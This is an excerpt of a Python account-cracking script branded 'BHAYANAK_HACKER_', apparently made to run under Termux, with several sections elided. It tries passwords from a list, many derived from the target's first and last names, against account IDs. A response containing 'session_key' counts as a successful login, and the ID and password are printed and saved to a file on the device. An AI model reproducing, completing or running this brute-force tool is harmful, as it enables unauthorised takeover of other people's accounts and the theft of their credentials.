...
| $$  \ $| $$  | $| $$  | $$   | $$  | $$  | $| $$\  $$| $$  | $| $$\  $$      | $$  | $| $$  | $| $$    $| $$\  $$| $$     | $$  \ $$      
| $$$$$$$| $$  | $| $$  | $$   | $$  | $$  | $| $$ \  $| $$  | $| $$ \  $$     | $$  | $| $$  | $|  $$$$$$| $$ \  $| $$$$$$$| $$  | $$      
|_______/|__/  |__|__/  |__/   |__/  |__/  |__|__/  \__|__/  |__|__/  \__/$$$$$|__/  |__|__/  |__/\______/|__/  \__|________|__/  |__/$$$$$$
                                                                        |______/                                                    |______/
                                                                                                                                            
                                                                                                                                         
    Tool Version :     1.3
    Thanks Alot  :     BHAYANAK_HACKER_
{50*"-"}'''
...
class crack_main():
        ...
        def m1(self,iid,name,passlist):
                try:
                        ...
                        sys.stdout.write('\r[BHAYANAK_HACKER_] %s / [OK-%s] \r'%(loop,len(ok)));sys.stdout.flush()
                        fn = name.split(' ')[0]
                        try:
                                ln = name.split(' ')[1]
                        except:
                        ...
                        for pw in passlist:
                                ...
                                if 'session_key' in po:
                                        print(' \033[1;32m[BHAYANAK_HACKER-OK] '+roid+' | '+pas+'\033[0;97m')
                                        open('/sdcard/BHAYANAK_HACKER__ok.txt','a').write(roid+'|'+pas+'\n')
                                        ok.append(iid)
                                        break
        ...
        def pasw(self):
                ...
                print(' Ok Ids Save In : /sdcard/BHAYANAK_HACKER__ok.txt')
                print(50*'-')
                input('\n Press enter to back ')
                main()
...
datar = []
datar.append(pat)
if '/data/data/com.termux/files/home/BHAYANAK_HACKER_' in datar:
        pass
else:
        for i in range(5000):
